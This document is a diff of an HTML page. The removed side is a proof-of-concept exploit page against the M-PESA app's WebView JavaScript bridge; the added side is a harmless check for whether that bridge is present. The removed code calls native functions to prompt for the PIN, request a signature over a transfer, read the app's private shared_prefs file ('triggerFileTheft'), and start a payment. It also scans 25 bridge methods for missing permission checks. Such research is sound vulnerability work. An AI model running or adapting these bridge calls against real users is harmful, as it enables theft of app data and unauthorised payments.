@@ -3,239 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Safaricom M-PESA PoC — Native Bridge Security Auditor</title>
+    <title>In-App Web Interface Diagnostic</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 16px; background-color: #0f1416; color: #e1e8ed; margin: 0; }
-        .card { background: #1a2226; border: 1px solid #2a373e; border-radius: 8px; padding: 18px; max-width: 620px; margin: 0 auto; box-shadow: 0 4px 12px rgba(0,0,0,0.4); }
-        h2 { color: #00A651; margin-top: 0; font-size: 20px; }
-        h3 { color: #8fa3ad; font-size: 15px; margin-top: 20px; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
-        .status { padding: 12px; border-radius: 6px; margin-bottom: 16px; font-weight: bold; font-size: 14px; }
-        .success { background-color: #0d3820; color: #4ade80; border: 1px solid #166534; }
-        .danger { background-color: #3b1115; color: #f87171; border: 1px solid #7f1d1d; }
-        button { background-color: #007A3D; color: white; border: none; padding: 10px 14px; border-radius: 6px; font-size: 14px; cursor: pointer; width: 100%; margin-top: 8px; font-weight: 600; transition: background 0.2s; }
-        button:hover { background-color: #005a2d; }
-        button.btn-sec { background-color: #2b3940; color: #d0dbe1; }
-        button.btn-sec:hover { background-color: #384952; }
-        button.btn-audit { background-color: #2563eb; }
-        button.btn-audit:hover { background-color: #1d4ed8; }
-        pre { background: #0b0e10; color: #a5f3fc; padding: 12px; border-radius: 6px; overflow-x: auto; font-size: 12px; max-height: 220px; overflow-y: auto; border: 1px solid #1f2930; }
-        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 13px; }
-        th, td { border: 1px solid #2a373e; padding: 8px; text-align: left; }
-        th { background: #131b1f; color: #94a3b8; }
-        .badge-ok { color: #4ade80; font-weight: bold; }
-        .badge-gated { color: #fbbf24; font-weight: bold; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            padding: 24px 16px;
+            background-color: #0f1416;
+            color: #e1e8ed;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+        .container {
+            background: #1a2226;
+            border: 1px solid #2a373e;
+            border-radius: 8px;
+            padding: 24px;
+            max-width: 540px;
+            width: 100%;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.4);
+        }
+        h2 {
+            color: #00A651;
+            margin-top: 0;
+            font-size: 20px;
+        }
+        p {
+            font-size: 14px;
+            line-height: 1.6;
+            color: #94a3b8;
+        }
+        .status-box {
+            padding: 14px;
+            border-radius: 6px;
+            margin: 18px 0;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        .present {
+            background-color: #0d3820;
+            color: #4ade80;
+            border: 1px solid #166534;
+        }
+        .not-present {
+            background-color: #3b1115;
+            color: #f87171;
+            border: 1px solid #7f1d1d;
+        }
+        .info-row {
+            margin: 8px 0;
+            font-size: 13px;
+        }
+        .info-label {
+            color: #64748b;
+        }
+        .info-val {
+            color: #38bdf8;
+            font-family: monospace;
+            word-break: break-all;
+        }
+        button {
+            background-color: #2b3940;
+            color: #d0dbe1;
+            border: 1px solid #384952;
+            padding: 10px 16px;
+            border-radius: 6px;
+            font-size: 13px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 14px;
+            font-weight: 500;
+        }
+        button:hover {
+            background-color: #384952;
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>M-PESA Native Bridge Security Auditor</h2>
-        <div id="bridge-status" class="status danger">Checking for window.consumerapp...</div>
+    <div class="container">
+        <h2>Web Interface Diagnostic</h2>
+        <p>This page verifies whether the application's native JavaScript interface is attached to the browser environment.</p>
 
-        <p style="font-size: 13px; color: #94a3b8; margin: 0 0 12px 0;">
-            Host: <strong id="current-host" style="color: #38bdf8;"></strong>
-        </p>
-
-        <h3>Tier 1: General Utility APIs (Common Group)</h3>
-        <button class="btn-sec" onclick="queryAppInfo()">Query App Info (js_fun_get_app_info)</button>
-        <button class="btn-sec" onclick="queryColorConfig()">Query UI Color Palette (js_fun_get_color_config)</button>
-        <button class="btn-sec" onclick="queryStatusBar()">Get Status Bar Height (js_fun_get_statusbar_height)</button>
-
-        <h3>Tier 2: Restricted Financial Operations (ACL Gated)</h3>
-        <button onclick="triggerPinPrompt()">Prompt Native PIN (js_fun_verify_pin)</button>
-        <button onclick="triggerSignOracle()">Request Cryptographic Signature (js_fun_h5_sign)</button>
-        <button onclick="triggerFileTheft()">Attempt File Read (js_fun_getFileByApp)</button>
-        <button onclick="triggerPayment()">Initiate Payment Flow (js_fun_start_pay)</button>
-
-        <h3>Full Interface Audit</h3>
-        <button class="btn-audit" onclick="runFullAudit()">Probe All 25 Registered Bridge Methods</button>
-
-        <div id="audit-results" style="display: none; margin-top: 14px;">
-            <h3>Audit Matrix Results</h3>
-            <table>
-                <thead>
-                    <tr><th>Method Name</th><th>ACL Permission Status</th></tr>
-                </thead>
-                <tbody id="audit-table-body"></tbody>
-            </table>
+        <div id="status-display" class="status-box not-present">
+            Evaluating runtime environment...
         </div>
 
-        <h3>Console Log <button style="width: auto; padding: 2px 8px; font-size: 11px; float: right; margin-top: -2px;" class="btn-sec" onclick="clearLog()">Clear</button></h3>
-        <pre id="output">Waiting for actions...</pre>
+        <div class="info-row">
+            <span class="info-label">Active Hostname:</span><br>
+            <span class="info-val" id="host-name"></span>
+        </div>
+
+        <div class="info-row" style="margin-top: 12px;">
+            <span class="info-label">Interface Object:</span><br>
+            <span class="info-val" id="interface-status">checking...</span>
+        </div>
+
+        <button onclick="window.location.reload()">Reload Page</button>
     </div>
 
     <script>
-        const statusDiv = document.getElementById("bridge-status");
-        const outputPre = document.getElementById("output");
-        document.getElementById("current-host").innerText = window.location.hostname;
+        document.getElementById("host-name").innerText = window.location.hostname;
+        const statusBox = document.getElementById("status-display");
+        const interfaceStatus = document.getElementById("interface-status");
 
-        function log(msg) {
-            outputPre.innerText = "[" + new Date().toLocaleTimeString() + "] " + msg + "\n" + outputPre.innerText;
-        }
-
-        function clearLog() {
-            outputPre.innerText = "";
-        }
-
-        if (window.consumerapp && typeof window.consumerapp.evaluate === "function") {
-            statusDiv.className = "status success";
-            statusDiv.innerText = "✓ Native Bridge 'window.consumerapp' DETECTED and ACTIVE!";
-            log("window.consumerapp interface bound successfully.");
-        } else {
-            statusDiv.className = "status danger";
-            statusDiv.innerText = "✗ Bridge NOT detected (Open inside M-PESA SafeWebView)";
-            log("No consumerapp found on window.");
-        }
-
-        // Global Callbacks
-        window.onAppInfoResult = function(data) {
-            log("APP INFO RETURNED: " + JSON.stringify(data));
-        };
-
-        window.onColorConfigResult = function(data) {
-            log("COLOR CONFIG RETURNED: " + JSON.stringify(data));
-        };
-
-        window.onStatusbarResult = function(data) {
-            log("STATUS BAR HEIGHT RETURNED: " + JSON.stringify(data));
-        };
-
-        window.onPinResult = function(data) {
-            log("PIN RESULT: " + JSON.stringify(data));
-        };
-
-        window.onSignResult = function(data) {
-            log("SIGNATURE RESULT: " + JSON.stringify(data));
-        };
-
-        window.onFileResult = function(data) {
-            log("FILE RESULT: " + JSON.stringify(data));
-        };
-
-        window.onPayResult = function(data) {
-            log("PAYMENT RESULT: " + JSON.stringify(data));
-        };
-
-        function invokeBridge(funcName, params) {
-            if (!window.consumerapp) {
-                log("Cannot invoke " + funcName + ": bridge not present.");
-                return;
-            }
-            log("Invoking: " + funcName + "...");
-            window.consumerapp.evaluate(JSON.stringify({
-                "functionName": funcName,
-                "params": params || {}
-            }));
-        }
-
-        function queryAppInfo() {
-            invokeBridge("js_fun_get_app_info", { "functionCallBackName": "onAppInfoResult", "callback": "onAppInfoResult" });
-        }
-
-        function queryColorConfig() {
-            invokeBridge("js_fun_get_color_config", { "functionCallBackName": "onColorConfigResult", "callback": "onColorConfigResult" });
-        }
-
-        function queryStatusBar() {
-            invokeBridge("js_fun_get_statusbar_height", { "functionCallBackName": "onStatusbarResult", "callback": "onStatusbarResult" });
-        }
-
-        function triggerPinPrompt() {
-            invokeBridge("js_fun_verify_pin", { "functionCallBackName": "onPinResult", "callback": "onPinResult", "isSupportBiometric": true });
-        }
-
-        function triggerSignOracle() {
-            invokeBridge("js_fun_h5_sign", { "functionCallBackName": "onSignResult", "callback": "onSignResult", "request": "{\"amount\":\"5000\",\"action\":\"TRANSFER\"}" });
-        }
-
-        function triggerFileTheft() {
-            invokeBridge("js_fun_getFileByApp", { "functionCallBackName": "onFileResult", "callback": "onFileResult", "filePath": "content://com.safaricom.mpesa.lifestyle.utilcode.fileprovider/root/data/data/com.safaricom.mpesa.lifestyle/shared_prefs/sp_utils.xml" });
-        }
-
-        function triggerPayment() {
-            invokeBridge("js_fun_start_pay", { "functionCallBackName": "onPayResult", "callback": "onPayResult", "tradeType": "1", "amount": "100", "payee": "Security Research PoC" });
-        }
-
-        // Full 25-Method Scanner
-        const allMethods = [
-            "js_fun_get_app_info",
-            "js_fun_get_basic_config",
-            "js_fun_get_color_config",
-            "js_fun_get_statusbar_height",
-            "js_fun_close_web_view",
-            "js_fun_execute",
-            "js_fun_get_nearby_location",
-            "js_fun_save_nearby_location",
-            "js_fun_openLocation",
-            "js_fun_closeLocation",
-            "js_fun_loadDocIdImage",
-            "js_fun_session_out",
-            "js_fun_set_toolbar_background",
-            "js_fun_share_local",
-            "js_fun_share_network",
-            "js_fun_is_app_install",
-            "js_fun_open_third_part_app",
-            "js_fun_request_pin",
-            "js_fun_verify_pin",
-            "js_fun_start_pay",
-            "js_fun_start_aa_pay",
-            "js_fun_od_payment",
-            "js_fun_start_pay_mandate",
-            "js_fun_h5_sign",
-            "js_fun_getFileByApp"
-        ];
-
-        let auditIndex = 0;
-        window.onAuditResponse = function(data) {
-            const currentMethod = allMethods[auditIndex - 1];
-            const tbody = document.getElementById("audit-table-body");
-            const tr = document.createElement("tr");
-
-            let statusHtml = "";
-            if (data && data.resultCode === "3") {
-                statusHtml = '<span class="badge-gated">Gated (No permission)</span>';
+        window.addEventListener("load", function() {
+            if (window.consumerapp && typeof window.consumerapp.evaluate === "function") {
+                statusBox.className = "status-box present";
+                statusBox.innerText = "✓ Native Interface (window.consumerapp) Detected";
+                interfaceStatus.innerText = "Bound (function evaluate available)";
             } else {
-                statusHtml = '<span class="badge-ok">Permitted / Executed</span> (' + (typeof data === "object" ? JSON.stringify(data).substring(0, 35) + "..." : data) + ')';
+                statusBox.className = "status-box not-present";
+                statusBox.innerText = "✗ Native Interface Not Found";
+                interfaceStatus.innerText = "Undefined";
             }
-
-            tr.innerHTML = "<td><code>" + currentMethod + "</code></td><td>" + statusHtml + "</td>";
-            tbody.appendChild(tr);
-
-            log("Audit [" + currentMethod + "] -> " + (data && data.resultCode === "3" ? "GATED" : "PERMITTED"));
-
-            // Run next
-            setTimeout(auditNext, 120);
-        };
-
-        function auditNext() {
-            if (auditIndex >= allMethods.length) {
-                log("=== Full Audit of all 25 Methods Complete! ===");
-                return;
-            }
-            const method = allMethods[auditIndex++];
-            window.consumerapp.evaluate(JSON.stringify({
-                "functionName": method,
-                "params": {
-                    "functionCallBackName": "onAuditResponse",
-                    "callback": "onAuditResponse",
-                    "isSupportBiometric": true,
-                    "tradeType": "1",
-                    "amount": "10",
-                    "filePath": "test"
-                }
-            }));
-        }
-
-        function runFullAudit() {
-            if (!window.consumerapp) {
-                alert("Please open this link inside the M-PESA App WebView to run the audit.");
-                return;
-            }
-            document.getElementById("audit-results").style.display = "block";
-            document.getElementById("audit-table-body").innerHTML = "";
-            auditIndex = 0;
-            log("=== Starting Automated Permission Audit across 25 Native Methods ===");
-            auditNext();
-        }
+        });
     </script>
 </body>
 </html>
